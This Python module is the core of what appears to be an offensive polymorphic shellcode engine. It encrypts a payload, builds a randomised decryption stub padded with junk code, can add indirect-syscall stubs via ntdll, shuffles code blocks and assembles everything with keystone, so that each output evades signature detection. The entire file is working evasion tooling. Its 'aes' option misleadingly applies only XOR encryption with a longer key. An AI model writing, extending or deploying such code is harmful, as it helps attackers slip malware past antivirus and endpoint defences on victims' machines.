"""Polymorphic shellcode engine — orchestrates all generation components.

Ties together register allocation, encryption, decryption stub generation,
syscall stub generation, block reordering, and keystone assembly to produce
unique shellcode wrappers on each invocation.
"""

from __future__ import annotations

import logging
import random
from dataclasses import dataclass

from keystone import Ks, KS_ARCH_X86, KS_MODE_64, KsError

from .block_reorder import CodeBlock, make_unique_labels, reorder_blocks
from .decryption_stub import generate_decryption_loop
from .encryption import encrypt_xor_multibyte
from .register_allocator import Role, allocate_registers
from .syscall_stub import generate_syscall_stub

logger = logging.getLogger(__name__)


@dataclass(frozen=True)
class EngineOptions:
    encryption: str = "aes"     # "aes" (32-byte key) or "xor" (16-byte key)
    syscalls: bool = True       # indirect syscalls vs direct jmp
    junk_density: int = 3       # 1-5: dead code between real instructions


@dataclass(frozen=True)
class GeneratedShellcode:
    shellcode: bytes
    stub_size: int
    payload_size: int
    total_size: int


class PolymorphicEngine:
    """Generates unique polymorphic shellcode wrappers."""

    def generate(self, payload: bytes, options: EngineOptions) -> GeneratedShellcode:
        """Wrap payload in a unique polymorphic stub.

        Returns [stub_bytes | encrypted_payload] where every call
        produces structurally different stub code.
        """
        rng = random.Random()  # Fresh OS-entropy seed

        # Step 1: Encrypt payload
        key_len = 32 if options.encryption == "aes" else 16
        encrypted = encrypt_xor_multibyte(payload, key_len=key_len)

        # Step 2: Allocate registers
        if options.syscalls:
            roles = [
                Role.COUNTER, Role.POINTER, Role.KEY,
                Role.TEMP1, Role.TEMP2,
                Role.SYSCALL_NUM, Role.NTDLL_BASE, Role.FUNC_ADDR,
            ]
        else:
            roles = [
                Role.COUNTER, Role.POINTER, Role.KEY,
                Role.TEMP1, Role.TEMP2,
            ]
        regs = allocate_registers(roles, rng)

        # Step 3: Generate unique labels
        payload_label = f"payload_{rng.randint(0x1000, 0xFFFF):x}"
        decrypt_done_label = f"dec_done_{rng.randint(0x1000, 0xFFFF):x}"

        # Step 4: Generate decryption loop assembly
        decrypt_asm = generate_decryption_loop(
            regs=regs,
            payload_size=len(payload),
            key_bytes=encrypted.key,
            junk_density=options.junk_density,
            rng=rng,
            payload_label=payload_label,
            done_label=decrypt_done_label,
        )

        # Step 5: Generate execution assembly
        if options.syscalls:
            exec_asm = generate_syscall_stub(
                regs=regs,
                payload_size=len(payload),
                junk_density=options.junk_density,
                rng=rng,
                decrypted_payload_label=payload_label,
            )
        else:
            # Simple: jmp directly to decrypted payload in-place
            exec_asm = [f"jmp {payload_label}"]

        # Step 6: Build code blocks for reordering
        block_labels = make_unique_labels(3, rng, prefix="s")

        blocks = [
            CodeBlock(
                label=block_labels[0],
                instructions=[f"jmp {block_labels[1]}"],
                next_label=block_labels[1],
            ),
            CodeBlock(
                label=block_labels[1],
                instructions=decrypt_asm,
                next_label=block_labels[2],
            ),
            CodeBlock(
                label=block_labels[2],
                instructions=[f"{decrypt_done_label}:"] + exec_asm,
                next_label=None,
            ),
        ]

        all_asm = reorder_blocks(blocks, rng)

        # Append payload label at the end (payload bytes follow stub)
        all_asm.append(f"{payload_label}:")

        # Step 7: Assemble with keystone
        asm_text = "\n".join(all_asm)
        logger.debug(
            "Assembling polymorphic stub (%d lines)", len(all_asm)
        )

        try:
            ks = Ks(KS_ARCH_X86, KS_MODE_64)
            encoding, insn_count = ks.asm(asm_text)
        except KsError as e:
            logger.error("Keystone assembly failed: %s", e)
            raise RuntimeError(f"Keystone assembly failed: {e}") from e

        if encoding is None:
            raise RuntimeError("Keystone produced no output")

        stub_bytes = bytes(encoding)

        # Step 8: Concatenate stub + encrypted payload
        final = stub_bytes + encrypted.ciphertext

        logger.info(
            "Generated polymorphic shellcode: stub=%d, payload=%d, total=%d bytes",
            len(stub_bytes), len(encrypted.ciphertext), len(final),
        )

        return GeneratedShellcode(
            shellcode=final,
            stub_size=len(stub_bytes),
            payload_size=len(encrypted.ciphertext),
            total_size=len(final),
        )
